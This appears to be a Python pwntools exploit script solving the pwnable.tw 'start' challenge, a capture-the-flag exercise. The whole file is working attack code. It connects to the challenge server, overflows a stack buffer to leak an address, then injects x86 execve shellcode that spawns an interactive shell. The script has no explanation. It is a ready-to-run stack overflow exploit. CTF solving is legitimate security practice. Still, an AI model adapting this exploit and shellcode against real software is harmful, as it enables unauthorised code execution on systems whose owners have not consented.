from pwn import *
r = remote('chall.pwnable.tw',10000)
heap = ELF('./start')
context.log_level = 'debug'
shellcode ='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
addr=0x08048087
r.recv()
r.send("1"*20+p32(addr))
adrresp = u32(r.recv(4))+0x14
log.success('adrresp:\t' + hex(adrresp))
r.recv()
r.send("B"*20+p32(adrresp)+shellcode)
r.interactive()
